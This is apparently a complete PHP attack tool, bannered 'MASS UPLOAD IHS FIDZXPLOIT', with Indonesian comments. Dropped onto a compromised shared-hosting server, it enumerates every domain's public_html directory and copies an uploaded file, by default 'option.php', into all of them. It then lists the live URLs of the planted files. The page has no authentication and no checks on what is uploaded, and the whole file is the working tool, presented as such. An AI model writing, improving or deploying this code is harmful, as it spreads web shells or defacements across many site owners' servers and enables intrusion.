<?php
// Error reporting untuk debugging
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Fungsi untuk mendapatkan direktori saat ini
function getCurrentDirectory() {
    return getcwd();
}

// Fungsi untuk mendapatkan daftar direktori dengan menampilkan semua level
function getDirectories($basePath, $depth = 1) {
    $directories = [];
    
    if (!is_dir($basePath)) {
        return $directories;
    }
    
    $items = scandir($basePath);
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $fullPath = $basePath . '/' . $item;
        
        if (is_dir($fullPath)) {
            $directories[] = [
                'name' => $item,
                'path' => $fullPath,
                'subdirs' => ($depth > 1) ? getDirectories($fullPath, $depth - 1) : []
            ];
        }
    }
    
    return $directories;
}

// Fungsi khusus untuk menampilkan direktori domains dan subdirektorinya
function getDomainsDirectories($basePath) {
    $directories = [];
    
    // Cek apakah direktori domains ada
    $domainsPath = $basePath . '/domains';
    if (is_dir($domainsPath)) {
        $domains = scandir($domainsPath);
        
        foreach ($domains as $domain) {
            if ($domain === '.' || $domain === '..') continue;
            
            $domainPath = $domainsPath . '/' . $domain;
            
            if (is_dir($domainPath)) {
                // Tambahkan domain utama
                $directories[] = [
                    'name' => 'domains/' . $domain,
                    'path' => $domainPath,
                    'type' => 'domain'
                ];
                
                // Cek public_html dalam domain
                $publicHtmlPath = $domainPath . '/public_html';
                if (is_dir($publicHtmlPath)) {
                    $directories[] = [
                        'name' => 'domains/' . $domain . '/public_html',
                        'path' => $publicHtmlPath,
                        'type' => 'public_html'
                    ];
                }
            }
        }
    }
    
    return $directories;
}

// Fungsi untuk upload file ke multiple direktori
function massUpload($sourceFile, $targetDirectories, $fileName) {
    $results = [];
    $uploadCount = 0;
    
    foreach ($targetDirectories as $dirInfo) {
        $dirPath = is_array($dirInfo) ? $dirInfo['path'] : $dirInfo;
        $targetPath = $dirPath . '/' . $fileName;
        
        if (copy($sourceFile, $targetPath)) {
            $results[] = [
                'status' => 'success',
                'path' => $targetPath,
                'url' => getUrlFromPath($targetPath)
            ];
            $uploadCount++;
        } else {
            $results[] = [
                'status' => 'error',
                'path' => $targetPath,
                'error' => 'Gagal mengupload file'
            ];
        }
    }
    
    return [
        'total' => count($targetDirectories),
        'success' => $uploadCount,
        'failed' => count($targetDirectories) - $uploadCount,
        'details' => $results
    ];
}

// Fungsi untuk mengubah path menjadi URL
function getUrlFromPath($path) {
    // Cari public_html dalam path
    if (strpos($path, 'public_html') !== false) {
        $parts = explode('public_html', $path);
        if (count($parts) > 1) {
            $webPath = ltrim($parts[1], '/');
            
            // Dapatkan domain dari path
            $domainParts = explode('/', $parts[0]);
            $domain = end($domainParts);
            
            $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
            return $protocol . "://" . $domain . "/" . $webPath;
        }
    }
    
    // Fallback ke method sebelumnya
    $basePath = getCurrentDirectory();
    $webPath = str_replace($basePath, '', $path);
    $webPath = ltrim($webPath, '/');
    
    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http";
    $host = $_SERVER['HTTP_HOST'];
    
    return $protocol . "://" . $host . "/" . $webPath;
}

// Proses form submission
$uploadResult = null;
$selectedDirs = [];

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['upload_file'])) {
    $selectedPath = $_POST['selected_path'] ?? getCurrentDirectory();
    $depth = intval($_POST['depth'] ?? 1);
    $fileName = $_POST['file_name'] ?? 'option.php';
    
    // Validasi depth
    $depth = max(1, min(5, $depth));
    
    // Dapatkan direktori target berdasarkan path yang dipilih
    if (strpos($selectedPath, 'domains') !== false) {
        // Jika memilih direktori domains, gunakan fungsi khusus
        $targetDirs = [];
        if (strpos($selectedPath, 'public_html') !== false) {
            // Jika memilih public_html spesifik
            $targetDirs[] = ['path' => $selectedPath];
        } else {
            // Jika memilih domain, cari semua public_html di dalamnya
            $domains = getDomainsDirectories(dirname($selectedPath));
            foreach ($domains as $domain) {
                if ($domain['type'] === 'public_html') {
                    $targetDirs[] = $domain;
                }
            }
        }
    } else {
        // Untuk direktori biasa
        $directories = getDirectories($selectedPath, $depth);
        $targetDirs = [];
        foreach ($directories as $dir) {
            $targetDirs[] = $dir;
            if ($depth > 1) {
                foreach ($dir['subdirs'] as $subdir) {
                    $targetDirs[] = $subdir;
                }
            }
        }
    }
    
    // Upload file
    if (!empty($targetDirs) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
        $tempFile = $_FILES['upload_file']['tmp_name'];
        $uploadResult = massUpload($tempFile, $targetDirs, $fileName);
    }
}

$currentDir = getCurrentDirectory();
$baseDirs = getDirectories($currentDir, 1);
$domainsDirs = getDomainsDirectories($currentDir);
?>

<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mass Upload Tool</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background-color: #0a0a0a;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            padding: 20px;
            line-height: 1.6;
        }
        
        .banner {
            text-align: center;
            font-size: 2.5rem;
            font-weight: bold;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #00ff00;
            animation: glow 1.5s ease-in-out infinite alternate;
            padding: 15px;
            border: 2px solid #00ff00;
            border-radius: 10px;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        
        .info-box {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid #00ff00;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        
        .dir-list {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
            gap: 10px;
            margin: 20px 0;
        }
        
        .dir-item {
            background: rgba(0, 255, 0, 0.1);
            border: 1px solid #00ff00;
            padding: 10px;
            border-radius: 5px;
            cursor: pointer;
            transition: all 0.3s;
            font-size: 0.9rem;
        }
        
        .dir-item:hover {
            background: rgba(0, 255, 0, 0.2);
            transform: translateY(-2px);
        }
        
        .dir-item.selected {
            background: rgba(0, 255, 0, 0.3);
            border-color: #ffff00;
        }
        
        .dir-item.domain {
            border-left: 4px solid #ff00ff;
        }
        
        .dir-item.public_html {
            border-left: 4px solid #ffff00;
            background: rgba(255, 255, 0, 0.1);
        }
        
        .upload-form {
            background: rgba(0, 255, 0, 0.05);
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 5px;
            margin: 20px 0;
        }
        
        .form-group {
            margin-bottom: 15px;
        }
        
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
        }
        
        input[type="file"],
        input[type="number"],
        input[type="text"],
        button {
            width: 100%;
            padding: 10px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid #00ff00;
            color: #00ff00;
            border-radius: 5px;
            font-family: 'Courier New', monospace;
        }
        
        button {
            background: rgba(0, 255, 0, 0.2);
            cursor: pointer;
            font-weight: bold;
            font-size: 1.2rem;
            transition: all 0.3s;
        }
        
        button:hover {
            background: rgba(0, 255, 0, 0.3);
            transform: translateY(-2px);
        }
        
        .output {
            background: rgba(0, 0, 0, 0.8);
            border: 1px solid #00ff00;
            padding: 20px;
            border-radius: 5px;
            margin-top: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        
        .success {
            color: #00ff00;
        }
        
        .error {
            color: #ff0000;
        }
        
        .url-list {
            margin-top: 10px;
        }
        
        .url-item {
            padding: 5px;
            border-bottom: 1px solid rgba(0, 255, 0, 0.2);
            word-break: break-all;
        }
        
        @keyframes glow {
            from {
                text-shadow: 0 0 10px #00ff00;
            }
            to {
                text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00;
            }
        }
        
        .stats {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 15px;
        }
        
        .stat-box {
            text-align: center;
            padding: 10px;
            border: 1px solid #00ff00;
            border-radius: 5px;
            background: rgba(0, 255, 0, 0.1);
        }
        
        .section-title {
            color: #ffff00;
            margin: 15px 0 10px 0;
            border-bottom: 1px solid #ffff00;
            padding-bottom: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="banner">
            MASS UPLOAD IHS FIDZXPLOIT
        </div>
        
        <div class="info-box">
            <strong>$ pwd:</strong> <?php echo $currentDir; ?>
        </div>
        
        <div class="upload-form">
            <form method="POST" enctype="multipart/form-data">
                <div class="form-group">
                    <label>Pilih File untuk Upload Massal:</label>
                    <input type="file" name="upload_file" required>
                </div>
                
                <div class="form-group">
                    <label>Nama File Target:</label>
                    <input type="text" name="file_name" value="option.php" required>
                </div>
                
                <div class="form-group">
                    <label>Kedalaman Direktori (1-5):</label>
                    <input type="number" name="depth" min="1" max="5" value="1" required>
                </div>
                
                <input type="hidden" name="selected_path" id="selected_path" value="<?php echo $currentDir; ?>">
                
                <button type="submit">START MASS!</button>
            </form>
        </div>
        
        <div class="info-box">
            <h3>Pilih Direktori untuk Upload:</h3>
            
            <div class="section-title">📁 Direktori Domains</div>
            <div class="dir-list">
                <?php if (!empty($domainsDirs)): ?>
                    <?php foreach ($domainsDirs as $dir): ?>
                        <div class="dir-item <?php echo $dir['type']; ?>" 
                             onclick="selectDirectory('<?php echo $dir['path']; ?>', '<?php echo $dir['name']; ?>')">
                            📊 <?php echo $dir['name']; ?>
                        </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <div style="color: #ff0000; padding: 10px;">
                        ❌ Direktori domains tidak ditemukan!
                    </div>
                <?php endif; ?>
            </div>
            
            <div class="section-title">📂 Direktori Lainnya</div>
            <div class="dir-list">
                <?php foreach ($baseDirs as $dir): ?>
                    <div class="dir-item" onclick="selectDirectory('<?php echo $dir['path']; ?>', '<?php echo $dir['name']; ?>')">
                        📁 <?php echo $dir['name']; ?>
                    </div>
                <?php endforeach; ?>
            </div>
        </div>
        
        <?php if ($uploadResult): ?>
            <div class="output">
                <h3>Hasil Upload Massal:</h3>
                
                <div class="stats">
                    <div class="stat-box">
                        <div>Total Direktori</div>
                        <div><?php echo $uploadResult['total']; ?></div>
                    </div>
                    <div class="stat-box success">
                        <div>Berhasil</div>
                        <div><?php echo $uploadResult['success']; ?></div>
                    </div>
                    <div class="stat-box error">
                        <div>Gagal</div>
                        <div><?php echo $uploadResult['failed']; ?></div>
                    </div>
                </div>
                
                <div class="url-list">
                    <?php foreach ($uploadResult['details'] as $result): ?>
                        <div class="url-item <?php echo $result['status']; ?>">
                            <?php if ($result['status'] === 'success'): ?>
                                ✅ <a href="<?php echo $result['url']; ?>" target="_blank" style="color: #00ff00;"><?php echo $result['url']; ?></a>
                            <?php else: ?>
                                ❌ <?php echo $result['path']; ?> - <?php echo $result['error']; ?>
                            <?php endif; ?>
                        </div>
                    <?php endforeach; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script>
        function selectDirectory(path, name) {
            document.getElementById('selected_path').value = path;
            
            // Update UI untuk menunjukkan direktori yang dipilih
            const dirItems = document.querySelectorAll('.dir-item');
            dirItems.forEach(item => {
                item.classList.remove('selected');
            });
            
            event.target.classList.add('selected');
            
            // Tampilkan alert dengan path yang dipilih
            alert('Direktori dipilih: ' + name + '\nPath: ' + path);
        }
        
        // Debug info
        console.log('Current directory: <?php echo $currentDir; ?>');
        console.log('Domains directories:', <?php echo json_encode($domainsDirs); ?>);
    </script>
</body>
</html>
